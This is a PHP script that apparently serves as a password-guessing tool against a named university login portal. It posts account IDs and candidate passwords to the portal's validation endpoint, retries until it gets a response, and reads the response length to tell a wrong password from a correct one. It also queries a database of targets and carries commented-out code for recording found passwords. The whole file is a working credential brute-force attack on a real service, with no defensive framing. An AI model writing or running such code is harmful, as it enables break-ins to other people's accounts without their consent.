<meta http-equiv="Content-Type" content="text/html; charset=UTF8" />
<?php
include("config.php"); 
ini_set ('memory_limit', '128M');
$maxn = 32000;
$last_dit = 11;
$lim = 2000;

//$filename = "run_my.txt";
//$fp = fopen($filename, "a+"); 
$textgzh = "00007949"; 
$begin = get_id( get_mark($textgzh), $last_dit );
$password_len = 6;
$marklength = 8;
$numrows = $maxn * $last_dit;
$order = mysql_query("SELECT * FROM need_gao WHERE can_my != 'YES' ORDER BY rank DESC");


$output = send_post($textgzh, "320000");
while (strlen($output) == 0) {
	$output = send_post($textgzh, "320000");
}
echo strlen($output) . "\n";
echo $output;




function deal_output($output, $textgzh, $password) {
    if (strlen($output) == 119) {
        echo "---->NO<----\n";
		//save_mark($textgzh, "NO");	
		//save_password($textgzh, $password);
        return false;
    }
    else {
        echo "---->YES<----\n";
        return true;
    }
}

function send_post($textgzh, $password) {
		$cookie_file = dirname(__FILE__) . '/cookie.txt';  //先获取cookies并保存
		$curlPost = 'Login.Token1=' . urlencode($textgzh).
					'&Login.Token2=' . urlencode($password). 
				    '&goto=http%3A%2F%2Fmy.whu.edu.cn%2FloginSuccess.portal&gotoOnFail=http%3A%2F%2Fmy.whu.edu.cn%2FloginFailure.portal';
		//echo $curlPost . "<hr />";
		$url = "http://my.whu.edu.cn/userPasswordValidate.portal";
		$ch = curl_init($url); //初始化
		curl_setopt($ch, CURLOPT_HEADER, 0); //不返回header部分
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //返回字符串，而非直接输出
		curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file); //存储cookies
		curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
		curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
		curl_setopt($ch, CURLOPT_TIMEOUT, 60 );
		$output=curl_exec($ch);
		////curl_close($ch);
		return $output;
}


function get_post_info($textgzh, $password) {
		//$cookie_file = dirname(__FILE__) . '/cookie.txt';  //先获取cookies并保存
		$curlPost = 'Login.Token1=' . urlencode($textgzh).
					'&Login.Token2=' . urlencode($password). 
				    '&goto=http%3A%2F%2Fmy.whu.edu.cn%2FloginSuccess.portal&gotoOnFail=http%3A%2F%2Fmy.whu.edu.cn%2FloginFailure.portal';
		//echo $curlPost . "<hr />";
		$url = "http://my.whu.edu.cn/userPasswordValidate.portal";
		$ch = curl_init($url); //初始化
		curl_setopt($ch, CURLOPT_HEADER, 0); //不返回header部分
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //返回字符串，而非直接输出
		//curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie_file); //存储cookies
		curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
		curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30 );
		//$output=curl_exec($ch);
		//curl_close($ch);
		return $ch;
}
